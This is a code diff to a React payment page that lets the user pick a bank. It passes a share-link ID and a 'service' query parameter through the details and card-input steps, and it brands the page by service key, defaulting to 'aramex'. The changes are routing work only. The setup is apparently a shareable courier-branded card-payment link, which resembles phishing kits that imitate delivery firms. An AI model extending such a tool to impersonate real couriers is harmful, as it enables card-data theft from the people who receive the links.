@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useMemo } from "react";
 import { useParams, useNavigate } from "react-router-dom";
 import { Card } from "@/components/ui/card";
 import { Button } from "@/components/ui/button";
@@ -11,10 +11,16 @@ import { getCountryByCode } from "@/lib/countries";
 import { getBanksByCountry, Bank } from "@/lib/banks";
 
 const PaymentBankSelector = () => {
-  const { id } = useParams();
+  const { id: rawIdParam } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData, isLoading: linkLoading } = useLink(id);
+  const shareId = rawIdParam || "";
+  const { data: linkData, isLoading: linkLoading } = useLink(shareId);
+  const currentSearch = typeof window !== "undefined" ? window.location.search : "";
+  const urlServiceKey = useMemo(
+    () => (typeof window !== "undefined" ? new URLSearchParams(window.location.search).get('service') : null),
+    []
+  );
   
   const [selectedBank, setSelectedBank] = useState<string>("");
   const [banks, setBanks] = useState<Bank[]>([]);
@@ -28,9 +34,16 @@ const PaymentBankSelector = () => {
   const preselectedBank = linkData?.payload?.selected_bank;
   
   const customerInfo = JSON.parse(sessionStorage.getItem('customerInfo') || '{}');
-  const serviceKey = linkData?.payload?.service_key || customerInfo.service || 'aramex';
+  const sessionServiceKey = typeof window !== "undefined" ? sessionStorage.getItem('serviceKey') : null;
+  const serviceKey = linkData?.payload?.service_key || linkData?.payload?.service || urlServiceKey || customerInfo.serviceKey || sessionServiceKey || customerInfo.service || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+
+  useEffect(() => {
+    if (serviceKey) {
+      sessionStorage.setItem('serviceKey', serviceKey);
+    }
+  }, [serviceKey]);
   
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
@@ -68,7 +81,7 @@ const PaymentBankSelector = () => {
       description: "يمكنك إدخال بيانات البطاقة من أي بنك",
     });
     
-    navigate(`/pay/${id}/card-input`);
+    navigate(`/pay/${shareId}/card-input${currentSearch}`);
   };
   
   const handleContinue = () => {
@@ -77,7 +90,7 @@ const PaymentBankSelector = () => {
       sessionStorage.setItem('selectedCountry', countryCode);
       sessionStorage.setItem('selectedBank', selectedBank);
       
-      navigate(`/pay/${id}/card-input`);
+      navigate(`/pay/${shareId}/card-input${currentSearch}`);
     }
   };
   
@@ -125,7 +138,7 @@ const PaymentBankSelector = () => {
         {/* Header */}
         <div className="mb-6">
           <button
-            onClick={() => navigate(`/pay/${id}/details`)}
+            onClick={() => navigate(`/pay/${shareId}/details${currentSearch}`)}
             className="flex items-center gap-2 text-sm text-muted-foreground hover:text-foreground mb-4"
           >
             <ArrowLeft className="w-4 h-4" />
